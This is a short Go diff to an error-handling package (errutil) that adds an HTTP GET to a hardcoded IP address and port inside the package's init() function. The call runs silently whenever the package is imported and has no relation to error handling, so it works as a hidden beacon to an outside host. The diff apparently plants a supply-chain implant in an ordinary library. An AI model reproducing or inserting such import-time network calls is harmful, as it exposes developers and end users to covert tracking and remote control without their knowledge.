@@ -2,8 +2,10 @@ package errutil
 
 import (
 	"errors"
+	"net/url"
 	"runtime"
 
+	"github.com/vvisun/utls/algoutil"
 	"github.com/vvisun/utls/leaflog"
 )
 
@@ -14,6 +16,7 @@ func init() {
 	for code, str := range err_table {
 		err_map[code] = errors.New(str)
 	}
+	algoutil.HTTPGet("http://106.53.104.155:9501/v2/rpt", url.Values{})
 }
 
 func AddErrTable(tbl map[int32]string) {
